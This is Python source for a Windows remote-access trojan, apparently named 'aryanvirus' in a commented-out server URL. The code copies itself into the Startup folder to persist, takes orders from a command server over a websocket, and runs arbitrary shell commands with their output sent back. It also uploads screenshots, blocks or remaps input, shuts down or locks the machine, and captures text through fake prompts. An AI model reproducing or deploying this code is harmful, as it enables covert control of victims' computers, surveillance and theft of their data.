import asyncio
import websockets
import websockets.exceptions
import pyautogui as pg
import keyboard
import os
import time
import requests
import socket
import subprocess
import webbrowser
import threading
import uuid

#function import
import blockInput
from notepadType import notepad_write
from prompt import alertPrompt
from prompt import inputPrompt

import shutil
from pathlib import Path
import sys

FLAG_FILE = Path(os.getenv('APPDATA')) / "my_program_first_run.flag"

def add_to_startup():
    print("initial move")
    try:
        print("startedmvoe")
        startup_dir = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        # startup_dir = Path(os.getenv('ProgramData')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        exe_path = Path(sys.argv[0]).resolve()  # now this is the exe
        destination = startup_dir / exe_path.name

        if not destination.exists():
            shutil.copy(exe_path, destination)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

if not FLAG_FILE.exists():
    add_to_startup()
    FLAG_FILE.touch()

serverUrl = "http://localhost:3000"    
uri = "ws://localhost:3000"

# serverUrl = "https://aryanvirus.onrender.com"
# uri = "wss://aryanvirus.onrender.com" 


POLL_INTERVAL = 60

"""check server variable to see if we should connect"""
def should_connect():
    try:
        r = requests.get(f"{serverUrl}/shouldconnect",timeout=5)
        j = r.json()
        return bool(j.get("connect"))
    except:
        return False



def take_screenshot():
    try:
        pc_name = socket.gethostname()
        filename = f"{pc_name}_screenshot.png"
        pg.screenshot(filename)
        url = f"{serverUrl}/upload"
        with open(filename,"rb") as f:
            requests.post(url,files={"screenshot":f})
        os.remove(filename)
    except:
        pass
      
def handle_msg(msg):
    try:
            if msg == "block":
                blockInput.start_block("both")
            elif msg == "blockkeyboard":
                blockInput.start_block("keyboard")
            elif msg == "blockmouse":
                blockInput.start_block("mouse")     
            elif msg == "unblock":
                blockInput.unblock_all()
            elif msg == "shutdown":
                os.system("shutdown /s /t 0")      
            elif msg=="desktop":
                pg.keyDown("win")
                pg.press("d")
                pg.keyUp("win")
            elif msg=="close":
                keyboard.send("alt+f4")
            elif msg=="screenshot":
                take_screenshot()
            elif msg=="lock":
                os.system("rundll32.exe user32.dll,LockWorkStation")
            elif msg=="end":
                os._exit(0)
    except:
        pass
def send_data():
    try:
        pc_name = socket.gethostname()
        mac = hex(uuid.getnode())
        pc_id = f"{pc_name}_{mac}"
        url = f"{serverUrl}/posttrace"
        requests.get(url,params={"pc_id":pc_id})
    except Exception as e:
        print(e)
        

def send_handler():
    threading.Thread(target=send_data).start()

keyboard.add_hotkey("ctrl+shift+q",send_handler)
                  
async def listen(): 
    pc_name = socket.gethostname()
    mac = hex(uuid.getnode())
    pc_id = f"{pc_name}_{mac}"
    while True:
        try:
            async with websockets.connect(uri,open_timeout=5,ping_interval=20,ping_timeout=10) as websocket:
                await websocket.send("Connected :"+pc_id)
                while True:
                    message = await websocket.recv() 
                    print("Recieved : ", message)
                    await websocket.send(f"ACK:{pc_id}")
                    if message == "checkflag":
                        try:
                            r = requests.get(f"{serverUrl}/shouldconnect",timeout=5)
                            if not r.json().get("connect",False):
                                await websocket.close()
                                return
                        except:pass
                    elif message.startswith("subprocess"):
                        command = message[len("subprocess "):]
                        try:
                            subprocess.run(command,shell=True)
                        except:pass    
                    elif message.startswith("browser"):
                    
                        command = message[len("browser "):]
                        print(command)
                        try:
                            webbrowser.open(command)
                        except:pass    
                    elif message.startswith("type"):
                    
                        command = message[len("type "):]
                        print(command)
                        pg.typewrite(command,0.2) 
                    elif message.startswith("notepadtypeheart"):
                    
                        command = message[len("notepadtypeheart "):]
                        try:
                            notepad_write(command,True)
                        except:pass         
                    elif message.startswith("notepadtype"):
                        command = message[len("notepadtype "):]
                        notepad_write(command,False) 
                    elif message.startswith("press"):
                    
                        command = message[len("press "):]
                        pg.press(command)    
                    elif message.startswith("alertprompt"):
                    
                        command = message[len("alertprompt "):]
                        alertPrompt(command) 
                    elif message.startswith("inputprompt"):
                    
                        try:
                            command = message[len("inputprompt "):]
                            value=inputPrompt(command)  
                            await websocket.send(value)
                        except:pass    
                    elif message.startswith("backspace"):
                    
                        command = message[len("backspace "):]
                        try:
                            for _ in range(int(command)):
                                pg.press("backspace")
                                time.sleep(0.05)
                        except Exception as e:
                            print(e)
                    elif message.startswith("blockkey"):
                    
                        command = message[len("blockkey "):]
                        try:
                            keyboard.block_key(command)
                        except:pass    
                    elif message.startswith("unblockkey"):
                        command = message[len("unblockkey "):]
                        try:
                            keyboard.unblock_key(command)
                        except:pass   
                    elif message.startswith("remap"):
                        command = message[len("remap "):]
                        try:
                            keyboard.remap_key(command[0],command[1])
                        except:pass    
                    elif message.startswith("swapkey"):
                        s = message[len("swapkey "):]
                        command = s.split()
                        try:
                            keyboard.remap_key(command[0],command[1])
                            keyboard.remap_key(command[1],command[0])   
                        except:pass    
                    elif message.startswith("cmdwithoutput"):
                        command = message[len("cmdwithoutput "):]
                        try:
                            result = subprocess.run(command,shell=True,capture_output=True,text=True)
                            await websocket.send(result.stdout)    
                        except:
                            pass                 
                    else:    
                        handle_msg(message)               
        except (websockets.exceptions.ConnectionClosedError,websockets.exceptions.InvalidHandshake,ConnectionRefusedError,asyncio.TimeoutError,OSError,socket.gaierror):
            print("connection lost . Reconnecting in 3 seconds ...")
            await asyncio.sleep(3)


async def poll_loop():
    while True:
        try:
            if should_connect():
                print("Server says connect - Starting Websocket")
                await listen()
            else:
                print("Server says No connect - sleeping 60s")
                await asyncio.sleep(POLL_INTERVAL)
        except:pass

asyncio.run(poll_loop())
